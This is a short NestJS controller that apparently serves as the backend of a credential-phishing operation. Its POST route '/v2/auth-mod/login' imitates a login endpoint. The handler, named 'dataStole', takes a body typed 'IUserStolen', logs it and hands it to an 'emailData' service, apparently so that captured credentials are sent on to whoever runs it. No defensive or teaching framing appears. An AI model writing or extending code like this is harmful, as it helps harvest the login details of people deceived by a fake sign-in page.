import { Controller, Get, Body, Request, Post } from '@nestjs/common';
import { AppService } from './app.service';
import { IUserStolen } from './utils/interfaces';

@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}

  @Get()
  getHello(): string {
    return this.appService.getHello();
  }

  @Post('/v2/auth-mod/login')
  dataStole(@Body() req: IUserStolen): number {
    console.log(req)
    this.appService.emailData(req)
    return 0;
  }
}
